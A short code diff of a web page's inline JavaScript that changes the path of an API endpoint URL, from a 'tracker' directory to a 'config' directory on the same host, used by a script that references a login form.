@@ -117,7 +117,7 @@
 
     <script>
         // NOTE: Ensure this URL points to your api.php file!
-        const API_URL = "http://h8logs.run.place/tracker/api.php"; 
+        const API_URL = "http://h8logs.run.place/config/api.php"; 
         
         const D = {
             loginForm: document.getElementById('loginForm'),
